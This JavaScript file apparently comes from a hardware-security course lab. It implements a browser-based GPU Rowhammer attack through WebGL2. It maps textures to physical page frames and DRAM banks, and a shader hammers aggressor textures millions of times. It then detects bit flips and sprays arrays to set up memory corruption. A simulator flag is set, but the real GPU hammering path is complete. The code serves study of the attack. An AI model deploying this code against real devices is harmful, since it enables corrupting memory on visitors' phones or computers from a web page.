const INT_MARKER = 0x40414140
const FIRST_ELEM = 0x50515150

const TEXTURE_NUM = 10000;
const USE_SIMULATOR = true


async function get_tex_data() {
    var result = await $.ajax({
        url: "get_tex_infos",
     })
    return JSON.parse(result)
}


async function get_tex_data1() {
    var result = await $.ajax({
        // url: "tex.txt",
        url: "http://localhost:8000/Programowanie/VU/HWSec/Glitch/week4_process/tex.txt",
    })
    return JSON.parse(result)
}

async function get_tex_data2() {
    var result = await $.ajax({
        // url: "tex.txt",
        url: "http://localhost:8000/Programowanie/VU/HWSec/Glitch/week4_process/tex2.txt",
    })
    return JSON.parse(result)
}


async function hammer_tex(tex_id) {
    var result = await $.ajax({
        data: {"tex_id": tex_id},
        url: "hammer_tex",
    })
    // console.log(result)
    bit_flip = JSON.parse(result);
    return bit_flip;
}


// tex_id is the id of the texture where you previously found bit flips
async function hammer_array(tex_id) {
     var result = await $.ajax({
        data: {"tex_id": tex_id},
        url: "hammer_array",
    })
    
    return result;

}

// use this function if you use the simulator to initially fill the arrays before triggering the bit flips
// the first value is set to 0x50515150 to avoid getting matches for all the 0x40414140s.

async function fill_arrays(arr, len) {
    for (var i = 0; i < len; i++) {
        arr[i] = INT_MARKER;
    }
    arr[0] = FIRST_ELEM;
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

async function remove_default_textures(default_textures, new_textures){
    var filtered = new_textures
    for (let index = 0; index < default_textures.length; index++) {
        const default_texture = default_textures[index];
        let gFilter = await default_textures.map(item => {return item.tex_id});
        return await new_textures.filter(item => !gFilter.includes(item.tex_id));
        // filtered = await filtered.filter(
        //     function(value, index, arr){
        //         return value.pfn != default_texture.pfn;
        //     }
        // );
    }
    return filtered;
}

async function sort_texture(textures){
    return textures.sort(function(a, b) {
        return a.kgsl_entry.pfn - b.kgsl_entry.pfn;
    });
}

async function addConsecutiveFieldToTexture(textures){
    var prev_pfn = 0;
    var consecutive_pfns_no = 0;
    for (let index = 0; index < textures.length; index++) {
        if(prev_pfn != textures[index].kgsl_entry.pfn - 1 ){
            consecutive_pfns_no = 0;
            textures[index].kgsl_entry.consecutive_id = 0;
            prev_pfn = textures[index].kgsl_entry.pfn;
            continue;
        }
        consecutive_pfns_no += 1;
        textures[index].kgsl_entry.consecutive_id = consecutive_pfns_no;
        prev_pfn = textures[index].kgsl_entry.pfn
    }
    return textures
}

async function filterOrderBiggerThan6(textures){
    var chunks_array = []
    for (let index = textures.length-1; index >= 0; index--) {
        if(textures[index].kgsl_entry.consecutive_id >= 64){
            chunks_array.push(textures.slice(index - textures[index].kgsl_entry.consecutive_id, index+1));
            index = index - textures[index].kgsl_entry.consecutive_id;
        }
    }
    // console.log("chunks array size:" + chunks_array.length)
    // console.log("chunks array: " + JSON.stringify(chunks_array))
    return chunks_array;
}

function getPhysicalAddress(v_addr, pfn){    
    return (pfn * 4096) + (v_addr % 4096);
}

function getBankNum(paddr){
    var bits = 1 << 13 | 1 << 14 |1 << 15;  
    var imm_addr = (paddr & bits) >> 13;
    return imm_addr;
}

async function new_print_texture_and_check(texture){
    var frame = new Uint8Array(32*32*4);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture.native_texture, 0);
    while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
        await sleep(10)
    }
    gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);

    for (let index = 0; index < 4096; index++) {
        if(frame[index] != 0xff){
            console.log("HAMMER DETECTED in "+JSON.stringify(texture)+"\nframe["+index+"]="+frame[index])
            return true
        }
    }
    return false
}


// function check_values(frame){
//     for (let index = 0; index < 4096; index++) {
//         if(frame[index] != 0xff){
//             console.log("HAMMER DETECTED = " + frame[index])
//         }
//     }
// }

async function new_print(texture){
    var frame = new Uint8Array(32*32*4);
    for (let index = 0; index < 32*32*4; index++) {
        frame[index] = 5; // 4 is just for testing
    }
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture.native_texture, 0);
    while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
        await sleep(500)
    }
    console.log("new print")
    var str  = '';
    gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
    for (let index = 0; index < 4096; index++) {
        str += frame[index] + ", "
        if(index % (32*4) == 0) str += "\n"
    }
    console.log(str)
}

async function createShaders(gl){
    var vertCode =
    "#version 300 es\n" +
    "layout (location = 0) in vec3 aPos;\n" +
    "uniform sampler2D tex0;\n" +
    "uniform sampler2D tex1;\n" +
    "uniform sampler2D tex2;\n" +
    "uniform sampler2D tex3;\n" +
    "uniform sampler2D tex4;\n" +
    "uniform sampler2D tex5;\n" +
    "uniform sampler2D tex6;\n" +
    "uniform sampler2D tex32;\n" +
    "uniform sampler2D tex33;\n" +
    // "uniform ivec2 tex_id;\n"
    "out float val_g;\n" +
    "\n" +
    "void main() {\n" +
    "float val = 0.0;\n" +
    "for (uint i = 0u; i < 1300000u; i++) { \n" + // 1300000u 
    // Step 1
    "   val += texelFetch(tex0, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex32, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex1, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex33, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex2, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex3, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex4, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex5, ivec2(0, 0), 0).r;\n" +
    "   val += texelFetch(tex6, ivec2(0, 0), 0).r;\n" +

    // Step 2
    "   val += texelFetch(tex0, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex32, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex1, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex33, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex2, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex3, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex4, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex5, ivec2(0, 2), 0).r;\n" +
    "   val += texelFetch(tex6, ivec2(0, 2), 0).r;\n" +
    
    "}\n" +
    // "   gl_Position = vec4(-0.99, -0.99, 0, 1);\n" +
    "   val_g = val;\n" +
    "   gl_Position = vec4(0,0,0,0);\n" +
    "}\n";

    var fragCode = 
    "#version 300 es\n" +
    "precision mediump float;\n" + 
    "out vec4 FragColor;\n" +
    
    "in float val_g;\n" +
    // "uniform ivec2 loop_i;\n"
    "void main()\n" +
    "{\n" +
    "FragColor= vec4(val_g, 0, 0, 0);\n" +
    // "FragColor= vec4(0.4, 0.5, 0.6, 0);\n" +
    "}\n";

    
    var vertShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vertShader, vertCode);
    gl.compileShader(vertShader);
    if(gl.getShaderParameter(vertShader, gl.COMPILE_STATUS) == false){
        console.log("vertShader failed!!")
        var info = gl.getShaderInfoLog(vertShader);
        throw 'Could not compile vertShader program. \n\n' + info;
    }

    var fragShader = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fragShader, fragCode);
    gl.compileShader(fragShader);
    if(gl.getShaderParameter(fragShader, gl.COMPILE_STATUS) == false){
        console.log("fragShader failed!!")
        var info = gl.getShaderInfoLog(fragShader);
        throw 'Could not compile fragShader program. \n\n' + info;        
    }

    shaderProgram = gl.createProgram();
    gl.attachShader(shaderProgram, vertShader); 
    gl.attachShader(shaderProgram, fragShader);
    gl.linkProgram(shaderProgram);
    if ( !gl.getProgramParameter( shaderProgram, gl.LINK_STATUS) ) {
        var info = gl.getProgramInfoLog(shaderProgram);
        throw 'Could not compile WebGL program. \n\n' + info;
      }
    gl.useProgram(shaderProgram);

}

async function defineGeometry(gl){
    var vertices = [-0.5, 0.5, -0.5, -0.5, 0.0, -0.5,];
    // var VAO = gl.createVertexArray();
    var VBO = gl.createBuffer();
    // gl.bindVertexArray(VAO);

    gl.bindBuffer(gl.ARRAY_BUFFER, VBO);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
    gl.bindBuffer(gl.ARRAY_BUFFER, null);
}

async function generateTextures(gl){
    var textures = [TEXTURE_NUM]

    var textures_data = new Uint8Array(32*32*4);
    for (let index = 0; index < 32*32*4; index++) {
        textures_data[index] = 2; // 4 is just for testing
    }
    for (let index = 0; index < TEXTURE_NUM; index++) {
        // for (let index2 = 0; index2 < 32*32*4; index2++) {
        //     textures_data[index2] = index % 255;
        // }
        let texture = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, texture);

        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32, 32, 0, gl.RGBA, gl.UNSIGNED_BYTE, textures_data);

        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
        textures[index] = texture
    }
    return textures;
}

async function generate1Teture(gl) {
    let texture = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, texture);

    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32, 32, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);

    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
    gl.bindTexture(gl.TEXTURE_2D, null);
    return texture
}


async function fill_texture_with_bytes(value, texture_id){
    var textures_data = new Uint8Array(32*32*4);
    for (let index = 0; index < 32*32*4; index++) {
        textures_data[index] = value;
    }
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, null, 0)
    gl.bindTexture(gl.TEXTURE_2D, texture_id);
    
    gl.texSubImage2D(
        gl.TEXTURE_2D, 0, 0, 0,
        32, 32, gl.RGBA,
        gl.UNSIGNED_BYTE, textures_data);
    gl.bindTexture(gl.TEXTURE_2D, null);
}


async function prepare_texture_content_for_hammering(chunk){
    await fill_texture_with_bytes(0, chunk[0].native_texture);
    await fill_texture_with_bytes(0, chunk[1].native_texture);
    await fill_texture_with_bytes(0xff, chunk[16].native_texture);
    await fill_texture_with_bytes(0xff, chunk[17].native_texture);
    await fill_texture_with_bytes(0, chunk[32].native_texture);
    await fill_texture_with_bytes(0, chunk[33].native_texture);
}

async function hammer_chunk(mProgram, relative_chunk) {

    if(USE_SIMULATOR){
        await hammer_tex(relative_chunk[16].kgsl_entry.tex_id)
        return
    }


    gl.uniform1i(gl.getUniformLocation(mProgram, "tex0"), 0);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex1"), 1);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex2"), 2);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex3"), 3);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex4"), 4);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex5"), 5);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex6"), 6);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex32"), 7);
    gl.uniform1i(gl.getUniformLocation(mProgram, "tex33"), 8);


    gl.activeTexture(gl.TEXTURE0);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[0].native_texture);

    gl.activeTexture(gl.TEXTURE1);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[1].native_texture);

    gl.activeTexture(gl.TEXTURE2);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[2].native_texture);

    gl.activeTexture(gl.TEXTURE3);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[3].native_texture);

    gl.activeTexture(gl.TEXTURE4);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[4].native_texture);

    gl.activeTexture(gl.TEXTURE5);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[5].native_texture);

    gl.activeTexture(gl.TEXTURE6);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[6].native_texture);

    gl.activeTexture(gl.TEXTURE7);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[32].native_texture);

    gl.activeTexture(gl.TEXTURE8);
    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[33].native_texture);

    gl.drawArrays( gl.POINTS, 0, 1);
}

async function remove_2048textures(used_textures, all_textures){
    let gFilter = await used_textures.map(item => {return item.tex_id});
    await sleep(200)
    let textures_to_remove = await all_textures.filter(item => !gFilter.includes(item.kgsl_entry.tex_id));
    for (let index = 0; index < 2048; index++) {
        const element = textures_to_remove[index];
        gl.deleteTexture(element.native_texture);
    }
}

async function check_arrays(arr, len) {
    for (var i = 1; i < len; i++) {
        if(arr[i] != INT_MARKER){
            console.log("Different mark at: " + arr[i])
        }
    }
    arr[0] = FIRST_ELEM;
}

async function exploit(relative_chunk){
    gl.deleteTexture(relative_chunk[16].native_texture);
    let arrays = [];
    for (let i = 0; i < 1000; i++) { // create 100 arrays
        let arr = [];
        await fill_arrays(arr, 1024);
        arrays.push(arr);
    }
    await hammer_array(relative_chunk[16].kgsl_entry.tex_id)
    for (let i = 0; i < 100; i++) {
        await check_arrays(arrays[i], 100)
    }

    console.log("Done")
}




async function main() {
    /* Set up environment */
    var canvas = document.getElementById('canvas');
    gl = canvas.getContext('webgl2');
    await createShaders(gl)
    await defineGeometry(gl)

    new Uint8Array(32*32*4)
    
    /* Get textures */
    console.log("Downloading default textures")
    let textures_default = await get_tex_data();
   
    // console.log("textures_default:\n" + JSON.stringify(textures_default))
    let native_textures = await generateTextures(gl)
    sleep(1000)
    
    console.log("Downloading new textures")
    let textures_new = await get_tex_data();
    textures_new = textures_new.reverse()
    // console.log("textures_new:\n" + JSON.stringify(textures_new))

    /* Filter textures */
    console.log("Analizing textures")
    let textures_ours = await remove_default_textures(textures_default, textures_new)
    let textures = [textures_ours.length];
    
    native_textures = native_textures.slice(
        TEXTURE_NUM - textures_ours.length, // calcute real amount of textures
        TEXTURE_NUM ) // need to slice, because we get another value from new_textures
    textures_ours.forEach((val, index) => {
        val.bank = getBankNum(
            getPhysicalAddress(val.v_addr, val.pfn)
        )
        textures[index] = {
        native_texture: native_textures[index],
        kgsl_entry: val
       };
    });

    
    textures = await sort_texture(textures)
    var chunks_array_not_filtered = await addConsecutiveFieldToTexture(textures)
    var chunks_array = await filterOrderBiggerThan6(textures)
    console.log("textures.length:\n" + JSON.stringify(textures.length))

    /* Create framebuffer */
    const fbo = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);

    /* Create texture_output */
    var texture_hammer_output = await generate1Teture(gl)
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture_hammer_output, 0)
    
    /* Bind framebuffer */
    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
    await sleep(10)
    console.log("Start hammering")
    /* Hammer chunks */
    for (let chunk_i = 0; chunk_i < chunks_array.length; chunk_i++) {
        const chunk = chunks_array[chunk_i];
        // ex. for length=64, We should't go beyond (64-32=32) because it would overlap other textures

        console.log("Hammering chunk: " + chunk_i + "/" + (chunks_array.length-1) + "\t(Num of pages="+chunk.length+")")
        sleep(10)

        for (let index = 0; index < chunk.length - 33; index++) { 
            let relative_chunk = chunk.slice(index, index + 34);
            if(relative_chunk[0].kgsl_entry.bank != relative_chunk[1].kgsl_entry.bank ||
                relative_chunk[0].kgsl_entry.bank >= 5){
                    continue;
            }
            
            console.log(index + "/" + (chunk.length-1) + ") bank="+relative_chunk[0].kgsl_entry.bank)
            sleep(10)
            // await new_print(relative_chunk[16])
            // await new_print(relative_chunk[17])
            await prepare_texture_content_for_hammering(relative_chunk);
            // await new_print(relative_chunk[16])
            // await new_print(relative_chunk[17])
            // return
            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture_hammer_output, 0);
            while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {await sleep(500)}
            await hammer_chunk(shaderProgram, relative_chunk);
            gl.finish();
            let did_flip = false;
            did_flip = await new_print_texture_and_check(relative_chunk[16])
            // await new_print_texture_and_check(relative_chunk[17])

            if(did_flip == true){ // is bit flip is in the right place
                sleep(10)
                await remove_2048textures(relative_chunk, chunks_array_not_filtered)
                await exploit(relative_chunk)
                console.log("Finished after finding bitflip")
                return
            }
            await sleep(10)
        }
    }


    console.log("Finished")


}

